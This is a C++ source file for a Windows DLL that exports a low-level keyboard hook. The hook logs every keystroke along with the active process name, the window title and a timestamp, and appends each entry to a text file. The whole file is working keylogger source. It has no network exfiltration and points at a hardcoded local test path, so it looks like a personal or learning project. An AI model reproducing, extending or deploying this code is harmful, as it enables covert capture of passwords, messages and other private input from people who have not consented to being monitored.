#include "Header.hh"

extern "C"
{
	__declspec(dllexport) LRESULT CALLBACK		 KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode < 0)
			return CallNextHookEx(NULL, nCode, wParam, lParam);

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			std::fstream file;
			std::string entry;
			file.open("C:\\Users\\Raphaël\\Desktop\\test.txt", std::fstream::in | std::fstream::app | std::fstream::out);
			if (file.is_open())
			{
				//Get character pressed
				KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
				BYTE keyboard_state[256];

				GetKeyboardState(keyboard_state);
				WORD character;

				std::cout << " code = " << kbdStruct->vkCode << std::endl;
				switch (kbdStruct->vkCode)
				{
				case VK_BACK:
					entry += "[BACK]";
					break;
				case VK_TAB:
					entry += "[TAB]";
					break;
				case VK_ESCAPE:
					entry += "[ESC]";
					break;
				case VK_SHIFT:
					entry += "[SHFIT]";
					break;
				case VK_CONTROL:
					entry += "[CTRL]";
					break;
				case VK_CAPITAL:
					entry += "[CAPS]";
					break;
				case VK_PAUSE:
					entry += "[PAUSE]";
					break;
				case VK_PRIOR:
					entry += "[P.UP]";
					break;
				case VK_NEXT:
					entry += "[P.DOWN]";
					break;
				case VK_END:
					entry += "[END]";
					break;
				case VK_HOME:
					entry += "[HOME]";
					break;
				case VK_LEFT:
					entry += "[LEFT]";
					break;
				case VK_UP:
					entry += "[UP]";
					break;
				case VK_RIGHT:
					entry += "[RIGHT]";
					break;
				case VK_DOWN:
					entry += "[DOWN]";
					break;
				case VK_PRINT:
					entry += "[PRINT]";
					break;
				case VK_EXECUTE:
					entry += "[EXECUTE]";
					break;
				case VK_SNAPSHOT:
					entry += "[SNAP]";
					break;
				case VK_INSERT:
					entry += "[INS]";
					break;
				case VK_DELETE:
					entry += "[DEL]";
					break;
				case VK_LWIN:
					entry += "[L.WIN]";
					break;
				case VK_RWIN:
					entry += "[R.WIN]";
					break;
				case VK_RETURN:
					entry += "[ENTER]";
					break;
				case VK_F1:
					entry += "[F1]";
					break;
				case VK_F2:
					entry += "[F2]";
					break;
				case VK_F3:
					entry += "[F3]";
					break;
				case VK_F4:
					entry += "[F4]";
					break;
				case VK_F5:
					entry += "[F5]";
					break;
				case VK_F6:
					entry += "[F6]";
					break;
				case VK_F7:
					entry += "[F7]";
					break;
				case VK_F8:
					entry += "[F8]";
					break;
				case VK_F9:
					entry += "[F9]";
					break;
				case VK_F10:
					entry += "[F10]";
					break;
				case VK_F11:
					entry += "[F11]";
					break;
				case VK_F12:
					entry += "[F12]";
					break;
				case VK_NUMLOCK:
					entry += "[NUML]";
					break;
				case VK_SCROLL:
					entry += "[SCROLL]";
					break;
				case VK_LCONTROL:
					entry += "[L.CTRL]";
					break;
				case VK_RCONTROL:
					entry += "[R.CTRL]";
					break;
				case VK_LSHIFT:
					entry += "[L.SHIFT]";
					break;
				case VK_RSHIFT:
					entry += "[R.SHIFT]";
					break;
				case VK_LMENU:
					entry += "[L.ALT]";
					break;
				case VK_RMENU:
					entry += "[R.ALT]";
					break;
				case VK_APPS:
					entry += "[APPS]";
					break;
				case VK_OEM_6:
					entry += "^";
					break;
				case VK_VOLUME_MUTE:
					entry += "[V.MUTE]";
					break;
				case VK_VOLUME_DOWN:
					entry += "[V.DOWN]";
					break;
				case VK_VOLUME_UP:
					entry += "[V.UP]";
					break;
				case VK_MEDIA_NEXT_TRACK:
					entry += "[M.NEXT]";
					break;
				case VK_MEDIA_PREV_TRACK:
					entry += "[M.PREV]";
					break;
				case VK_MEDIA_PLAY_PAUSE:
					entry += "[M.PLAY/PAUSE]";
					break;
				case VK_MEDIA_STOP:
					entry += "[M.STOP]";
					break;
				default:
					if (!(MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_CHAR) >> (sizeof(UINT) * 8 - 1) & 1))
					{
						ToAscii((UINT)kbdStruct->vkCode, kbdStruct->scanCode,
							keyboard_state, &character, 0);
						entry += (char)(character);
					}
					break;
				}

				// Get focused process name
				HWND hwnd = GetForegroundWindow(); // get handle of currently active window
				DWORD winId;
				GetWindowThreadProcessId(hwnd, &winId);
				HANDLE Handle = OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE,
					winId
					);
				if (Handle)
				{
					TCHAR Buffer[MAX_PATH];
					if (GetProcessImageFileName(Handle, Buffer, MAX_PATH))
					{
						std::string process = std::string(Buffer);
						entry += " " + process.substr(process.find_last_of("\\") + 1);
					}
					CloseHandle(Handle);
				}
				char windowTitle[256];
				GetWindowText(hwnd, windowTitle, 256);
				std::string windowName(windowTitle);
				std::replace(windowName.begin(), windowName.end(), ' ', '_');
				entry += " " + windowName;
				// Get timestamp
				//struct tm *dt;
				time_t current;
				time(&current);
				std::stringstream ss;
				ss << current;
				//char buffer[30];
				//dt = localtime(&current);
				//strftime(buffer, sizeof(buffer), "%d/%m/%Y %H:%M:%S", dt);
				std::string tmp;
				ss >> tmp;
				entry += " " + tmp;
				entry += "\n";
				file << entry.c_str();
				file.close();
			}
			else
				std::cout << "could not open the file" << std::endl;
		}

		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
}